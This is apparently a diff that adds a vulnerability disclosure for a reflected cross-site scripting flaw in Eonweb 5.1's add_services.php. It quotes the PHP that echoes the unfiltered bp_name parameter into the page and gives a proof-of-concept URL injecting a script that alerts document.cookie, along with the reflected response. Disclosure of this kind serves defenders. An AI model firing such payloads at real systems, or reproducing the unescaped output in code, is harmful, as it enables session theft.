@@ -1,0 +1,43 @@
+Eonweb_module_admin_bp_add_services cross-site scripting (XSS)
+Powered by shaojiejiang from 360 SkyEye Labs
+version: 5.1
+https://github.com/EyesOfNetworkCommunity/eonweb
+
+Vulnerability details
+
+# 0x01
+/module/admin_bp/add_services.php Line 26 and Line 41
+
+$bp_name = isset($_GET['bp_name']) ? $_GET['bp_name'] : false;
+$display_actually_bp = isset($_GET['display']) ? $_GET['display'] : false;
+
+try {
+    $bdd = new PDO("mysql:host=$database_host;dbname=nagiosbp", $database_username, $database_password);
+    }
+catch(Exception $e) {
+	echo "Connection failed: " . $e->getMessage();
+	exit('Impossible de se connecter à la base de données.');
+}
+
+print "<div id=\"page-wrapper\">";
+
+	print "<div class=\"row\">";
+		print "<div class=\"col-lg-12\">";
+			print "<h1 class=\"page-header bp_name\">".getLabel("label.admin_bp.business_process")." : $bp_name</h1>";
+		print "</div>";
+    print "</div>";
+
+$_GET['bp_name'] has not been filtered to cause cross-site scripting (XSS)
+
+# 0x02
+EXP:
+
+
+URL：https://192.168.227.169/module/admin_bp/add_services.php?bp_name=123<script>alert(document.cookie)</script>&display=3
+
+
+
+the return page has the payload:
+
+<div id="page-wrapper"><div class="row"><div class="col-lg-12"><h1 class="page-header bp_name">
+Business process : 123<script>alert(document.cookie)</script></h1></div></div><div class="row">
